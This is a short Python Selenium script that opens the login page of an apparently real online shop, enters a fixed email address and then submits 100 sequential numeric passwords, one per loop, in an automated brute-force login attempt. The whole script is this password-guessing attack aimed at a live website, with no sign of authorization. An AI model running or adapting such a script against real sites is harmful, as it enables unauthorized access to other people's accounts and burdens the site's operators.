from selenium import webdriver
import time

mail = "tareauno@pebih.com"
contrasena = "100000"

driver = webdriver.Chrome()
driver.get('https://gameshark.cl/iniciar-sesion?back=my-account')
time.sleep(5)

box = driver.find_element_by_xpath('//*[@id="login-form"]/section/div[1]/div[1]/input')
box.send_keys(mail)
for i in range(100):
    a = int(contrasena)
    a = a + 1
    contrasena = str(a)
    print(contrasena)
    box = driver.find_element_by_xpath('//*[@id="login-form"]/section/div[2]/div[1]/div/input')
    box.send_keys(contrasena)
    box = driver.find_element_by_xpath('//*[@id="submit-login"]').click()
time.sleep(5)